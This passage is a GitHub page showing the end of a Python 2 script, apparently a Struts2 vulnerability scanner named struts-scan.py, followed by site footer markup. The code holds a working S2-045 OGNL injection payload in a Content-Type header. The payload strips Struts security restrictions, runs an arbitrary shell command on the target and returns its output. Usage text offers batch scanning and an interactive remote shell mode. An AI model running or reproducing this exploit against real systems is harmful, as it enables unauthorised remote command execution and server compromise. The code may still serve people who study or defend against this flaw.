      <tr>
        <td id="L344" class="blob-num js-line-number" data-line-number="344"></td>
        <td id="LC344" class="blob-code blob-code-inner js-file-line">                        <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L345" class="blob-num js-line-number" data-line-number="345"></td>
        <td id="LC345" class="blob-code blob-code-inner js-file-line">                        <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L346" class="blob-num js-line-number" data-line-number="346"></td>
        <td id="LC346" class="blob-code blob-code-inner js-file-line">                        <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>%{(#szgx=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;<span class="pl-pds">&quot;</span></span><span class="pl-k">+</span>command<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">&quot;</span>&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L347" class="blob-num js-line-number" data-line-number="347"></td>
        <td id="LC347" class="blob-code blob-code-inner js-file-line">                    }</td>
      </tr>
      <tr>
        <td id="L348" class="blob-num js-line-number" data-line-number="348"></td>
        <td id="LC348" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L349" class="blob-num js-line-number" data-line-number="349"></td>
        <td id="LC349" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>, <span class="pl-v">headers</span><span class="pl-k">=</span>headers_exp, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L350" class="blob-num js-line-number" data-line-number="350"></td>
        <td id="LC350" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L351" class="blob-num js-line-number" data-line-number="351"></td>
        <td id="LC351" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L352" class="blob-num js-line-number" data-line-number="352"></td>
        <td id="LC352" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L353" class="blob-num js-line-number" data-line-number="353"></td>
        <td id="LC353" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L354" class="blob-num js-line-number" data-line-number="354"></td>
        <td id="LC354" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L355" class="blob-num js-line-number" data-line-number="355"></td>
        <td id="LC355" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L356" class="blob-num js-line-number" data-line-number="356"></td>
        <td id="LC356" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L357" class="blob-num js-line-number" data-line-number="357"></td>
        <td id="LC357" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span> <span class="pl-c1">__name__</span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>__main__<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L358" class="blob-num js-line-number" data-line-number="358"></td>
        <td id="LC358" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L359" class="blob-num js-line-number" data-line-number="359"></td>
        <td id="LC359" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> sys.argv[<span class="pl-c1">1</span>] <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>-f<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L360" class="blob-num js-line-number" data-line-number="360"></td>
        <td id="LC360" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">with</span> <span class="pl-c1">open</span>(sys.argv[<span class="pl-c1">2</span>]) <span class="pl-k">as</span> f:</td>
      </tr>
      <tr>
        <td id="L361" class="blob-num js-line-number" data-line-number="361"></td>
        <td id="LC361" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">for</span> line <span class="pl-k">in</span> f.readlines():</td>
      </tr>
      <tr>
        <td id="L362" class="blob-num js-line-number" data-line-number="362"></td>
        <td id="LC362" class="blob-code blob-code-inner js-file-line">                    line <span class="pl-k">=</span> line.strip()</td>
      </tr>
      <tr>
        <td id="L363" class="blob-num js-line-number" data-line-number="363"></td>
        <td id="LC363" class="blob-code blob-code-inner js-file-line">                    strutsVuln <span class="pl-k">=</span> struts_baseverify(line)</td>
      </tr>
      <tr>
        <td id="L364" class="blob-num js-line-number" data-line-number="364"></td>
        <td id="LC364" class="blob-code blob-code-inner js-file-line">                    strutsVuln.scan()</td>
      </tr>
      <tr>
        <td id="L365" class="blob-num js-line-number" data-line-number="365"></td>
        <td id="LC365" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">elif</span> sys.argv[<span class="pl-c1">1</span>] <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>-u<span class="pl-pds">&quot;</span></span> <span class="pl-k">and</span> sys.argv[<span class="pl-c1">3</span>] <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>-i<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L366" class="blob-num js-line-number" data-line-number="366"></td>
        <td id="LC366" class="blob-code blob-code-inner js-file-line">            strutsVuln <span class="pl-k">=</span> struts_baseverify(sys.argv[<span class="pl-c1">2</span>].strip())</td>
      </tr>
      <tr>
        <td id="L367" class="blob-num js-line-number" data-line-number="367"></td>
        <td id="LC367" class="blob-code blob-code-inner js-file-line">            strutsVuln.inShell(sys.argv[<span class="pl-c1">4</span>].strip())</td>
      </tr>
      <tr>
        <td id="L368" class="blob-num js-line-number" data-line-number="368"></td>
        <td id="LC368" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L369" class="blob-num js-line-number" data-line-number="369"></td>
        <td id="LC369" class="blob-code blob-code-inner js-file-line">            strutsVuln <span class="pl-k">=</span> struts_baseverify(sys.argv[<span class="pl-c1">1</span>].strip())</td>
      </tr>
      <tr>
        <td id="L370" class="blob-num js-line-number" data-line-number="370"></td>
        <td id="LC370" class="blob-code blob-code-inner js-file-line">            strutsVuln.scan()</td>
      </tr>
      <tr>
        <td id="L371" class="blob-num js-line-number" data-line-number="371"></td>
        <td id="LC371" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">except</span> <span class="pl-c1">Exception</span> <span class="pl-k">as</span> e:</td>
      </tr>
      <tr>
        <td id="L372" class="blob-num js-line-number" data-line-number="372"></td>
        <td id="LC372" class="blob-code blob-code-inner js-file-line">        figlet <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span></span></td>
      </tr>
      <tr>
        <td id="L373" class="blob-num js-line-number" data-line-number="373"></td>
        <td id="LC373" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ____  _              _            ____                  </span></td>
      </tr>
      <tr>
        <td id="L374" class="blob-num js-line-number" data-line-number="374"></td>
        <td id="LC374" class="blob-code blob-code-inner js-file-line"><span class="pl-s">/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  </span></td>
      </tr>
      <tr>
        <td id="L375" class="blob-num js-line-number" data-line-number="375"></td>
        <td id="LC375" class="blob-code blob-code-inner js-file-line"><span class="pl-s">\___ \| __| &#39;__| | | | __/ __|____\___ \ / __/ _` | &#39;_ \ </span></td>
      </tr>
      <tr>
        <td id="L376" class="blob-num js-line-number" data-line-number="376"></td>
        <td id="LC376" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |</span></td>
      </tr>
      <tr>
        <td id="L377" class="blob-num js-line-number" data-line-number="377"></td>
        <td id="LC377" class="blob-code blob-code-inner js-file-line"><span class="pl-s">|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|</span></td>
      </tr>
      <tr>
        <td id="L378" class="blob-num js-line-number" data-line-number="378"></td>
        <td id="LC378" class="blob-code blob-code-inner js-file-line"><span class="pl-s">                                        Code by Lucifer.</span></td>
      </tr>
      <tr>
        <td id="L379" class="blob-num js-line-number" data-line-number="379"></td>
        <td id="LC379" class="blob-code blob-code-inner js-file-line"><span class="pl-s">        <span class="pl-pds">&#39;&#39;&#39;</span></span></td>
      </tr>
      <tr>
        <td id="L380" class="blob-num js-line-number" data-line-number="380"></td>
        <td id="LC380" class="blob-code blob-code-inner js-file-line">        cprint(figlet,<span class="pl-s"><span class="pl-pds">&#39;</span>cyan<span class="pl-pds">&#39;</span></span>)</td>
      </tr>
      <tr>
        <td id="L381" class="blob-num js-line-number" data-line-number="381"></td>
        <td id="LC381" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Usage: python struts-scan.py http://example.com/index.action  检测<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L382" class="blob-num js-line-number" data-line-number="382"></td>
        <td id="LC382" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>       python struts-scan.py -u http://example.com/index.action -i struts2-045 进入指定漏洞交互式shell<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L383" class="blob-num js-line-number" data-line-number="383"></td>
        <td id="LC383" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>       python struts-scan.py -f url.txt  批量检测<span class="pl-pds">&quot;</span></span></td>
      </tr>
</table>

  <div class="BlobToolbar position-absolute js-file-line-actions dropdown js-menu-container js-select-menu d-none" aria-hidden="true">
    <button class="btn-octicon ml-0 px-2 p-0 bg-white border border-gray-dark rounded-1 dropdown-toggle js-menu-target" id="js-file-line-action-button" type="button" aria-expanded="false" aria-haspopup="true" aria-label="Inline file action toolbar" aria-controls="inline-file-actions">
      <svg aria-hidden="true" class="octicon" height="16" version="1.1" viewBox="0 0 13 4" width="14">
        <g stroke="none" stroke-width="1" fill-rule="evenodd">
            <g transform="translate(-1.000000, -6.000000)">
                <path d="M2.5,9.5 C1.67157288,9.5 1,8.82842712 1,8 C1,7.17157288 1.67157288,6.5 2.5,6.5 C3.32842712,6.5 4,7.17157288 4,8 C4,8.82842712 3.32842712,9.5 2.5,9.5 Z M7.5,9.5 C6.67157288,9.5 6,8.82842712 6,8 C6,7.17157288 6.67157288,6.5 7.5,6.5 C8.32842712,6.5 9,7.17157288 9,8 C9,8.82842712 8.32842712,9.5 7.5,9.5 Z M12.5,9.5 C11.6715729,9.5 11,8.82842712 11,8 C11,7.17157288 11.6715729,6.5 12.5,6.5 C13.3284271,6.5 14,7.17157288 14,8 C14,8.82842712 13.3284271,9.5 12.5,9.5 Z"></path>
            </g>
        </g>
      </svg>
    </button>
    <div class="dropdown-menu-content js-menu-content" id="inline-file-actions">
      <ul class="BlobToolbar-dropdown dropdown-menu dropdown-menu-se mt-2">
        <li><a class="js-zeroclipboard dropdown-item" style="cursor:pointer;" id="js-copy-lines" data-original-text="Copy lines">Copy lines</a></li>
        <li><a class="js-zeroclipboard dropdown-item" id= "js-copy-permalink" style="cursor:pointer;" data-original-text="Copy permalink">Copy permalink</a></li>
        <li><a href="/Lucifer1993/struts-scan/blame/488fedfc6ade8fc3d54361a317c8379e8dffcacd/struts-scan.py" class="dropdown-item js-update-url-with-hash" id="js-view-git-blame">View git blame</a></li>
          <li><a href="/Lucifer1993/struts-scan/issues/new" class="dropdown-item" id="js-new-issue">Open new issue</a></li>
      </ul>
    </div>
  </div>

  </div>

  </div>

  <button type="button" data-facebox="#jump-to-line" data-facebox-class="linejump" data-hotkey="l" class="d-none">Jump to Line</button>
  <div id="jump-to-line" style="display:none">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form accept-charset="UTF-8" action="" class="js-jump-to-line-form" method="get"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /></div>
      <input class="form-control linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;" aria-label="Jump to line" autofocus>
      <button type="submit" class="btn">Go</button>
</form>  </div>

  </div>
  <div class="modal-backdrop js-touch-events"></div>
</div>

    </div>
  </div>

  </div>

      
<div class="footer container-lg px-3" role="contentinfo">
  <div class="position-relative d-flex flex-justify-between py-6 mt-6 f6 text-gray border-top border-gray-light ">
    <ul class="list-style-none d-flex flex-wrap ">
      <li class="mr-3">&copy; 2017 <span title="0.11292s from unicorn-169138841-s65rr">GitHub</span>, Inc.</li>
        <li class="mr-3"><a href="https://github.com/site/terms" data-ga-click="Footer, go to terms, text:terms">Terms</a></li>
        <li class="mr-3"><a href="https://github.com/site/privacy" data-ga-click="Footer, go to privacy, text:privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://github.com/security" data-ga-click="Footer, go to security, text:security">Security</a></li>
        <li class="mr-3"><a href="https://status.github.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>
        <li><a href="https://help.github.com" data-ga-click="Footer, go to help, text:help">Help</a></li>
    </ul>

    <a href="https://github.com" aria-label="Homepage" class="footer-octicon" title="GitHub">
      <svg aria-hidden="true" class="octicon octicon-mark-github" height="24" version="1.1" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
</a>
    <ul class="list-style-none d-flex flex-wrap ">
        <li class="mr-3"><a href="https://github.com/contact" data-ga-click="Footer, go to contact, text:contact">Contact GitHub</a></li>
      <li class="mr-3"><a href="https://developer.github.com" data-ga-click="Footer, go to api, text:api">API</a></li>
      <li class="mr-3"><a href="https://training.github.com" data-ga-click="Footer, go to training, text:training">Training</a></li>
      <li class="mr-3"><a href="https://shop.github.com" data-ga-click="Footer, go to shop, text:shop">Shop</a></li>
        <li class="mr-3"><a href="https://github.com/blog" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
        <li><a href="https://github.com/about" data-ga-click="Footer, go to about, text:about">About</a></li>

    </ul>
  </div>
</div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg aria-hidden="true" class="octicon octicon-alert" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M8.865 1.52c-.18-.31-.51-.5-.87-.5s-.69.19-.87.5L.275 13.5c-.18.31-.18.69 0 1 .19.31.52.5.87.5h13.7c.36 0 .69-.19.86-.5.17-.31.18-.69.01-1L8.865 1.52zM8.995 13h-2v-2h2v2zm0-3h-2V6h2v4z"/></svg>
    <button type="button" class="flash-close js-flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" class="octicon octicon-x" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48z"/></svg>
    </button>
    You can't perform that action at this time.
  </div>


  <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner d-none">
    <svg aria-hidden="true" class="octicon octicon-alert" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M8.865 1.52c-.18-.31-.51-.5-.87-.5s-.69.19-.87.5L.275 13.5c-.18.31-.18.69 0 1 .19.31.52.5.87.5h13.7c.36 0 .69-.19.86-.5.17-.31.18-.69.01-1L8.865 1.52zM8.995 13h-2v-2h2v2zm0-3h-2V6h2v4z"/></svg>
    <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="signed-out-tab-flash">You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
  <div class="facebox" id="facebox" style="display:none;">
  <div class="facebox-popup">
    <div class="facebox-content" role="dialog" aria-labelledby="facebox-header" aria-describedby="facebox-description">
    </div>
    <button type="button" class="facebox-close js-facebox-close" aria-label="Close modal">
      <svg aria-hidden="true" class="octicon octicon-x" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48z"/></svg>
    </button>
  </div>
</div>


  </body>
</html>

